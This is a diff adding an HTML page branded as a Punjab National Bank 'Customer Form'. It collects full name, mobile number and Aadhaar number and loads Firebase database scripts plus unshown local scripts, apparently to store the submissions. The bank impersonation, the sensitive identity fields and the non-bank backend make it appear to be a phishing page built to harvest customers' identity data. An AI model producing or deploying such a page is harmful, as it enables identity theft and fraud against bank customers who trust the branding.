@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PNB Customer Form</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 30px 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    /* Responsive Logo Styling */
+    .logo {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 10px;  /* Reduced gap below logo */
+    }
+
+    h2 {
+      color: #800000;
+      margin-bottom: 15px; /* Reduced heading bottom margin */
+      font-size: 22px;
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #333;
+      font-size: 14px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    .submit-btn {
+      background-color: #800000;
+      color: white;
+      border: none;
+      padding: 12px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 15px;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #a00000;
+    }
+
+    /* Responsive styles for smaller devices */
+    @media (max-width: 480px) {
+      h2 {
+        font-size: 18px;
+      }
+
+      .submit-btn {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://imgs.search.brave.com/cuc-YnW92LMu7Hb26PmetqEf8r8DY2stSDvJbdvbBuQ/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzM0LzIvcHVuamFi/LW5hdGlvbmFsLWJh/bmstbG9nby1wbmdf/c2Vla2xvZ28tMzQz/OTgwLnBuZz92PTE5/NTUxMTY2MzU5NDk1/NTgxNDQ" alt="PNB Logo" class="logo">
+
+    <h2>Customer Details </h2>
+
+    <!-- Form -->
+   <form id="ududip007" class="form-group" method="post" autocomplete="off">
+      <div class="form-group">
+        <label for="a1">Full Name</label>
+        <input type="text" id="a1" name="fullName" placeholder="Enter Full Name" required>
+      </div>
+      <div class="form-group">
+        <label for="b1">Mobile Number</label>
+        <input type="text" id="b1" name="mobileNumber" placeholder="Enter Mobile Number" required>
+      </div>
+      <div class="form-group">
+        <label for="c1">Aadhar Number</label>
+        <input type="text" id="c1" name="aadharNumber" placeholder="Enter Aadhar Number" required>
+      </div>
+      <button type="submit" class="submit-btn">Submit</button>
+    </form>
+  </div>
+
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+    
+ <script src="firebase.js">  </script>
+<script src="name.js">  </script>
+
+
+
+
+</body>
+</html>
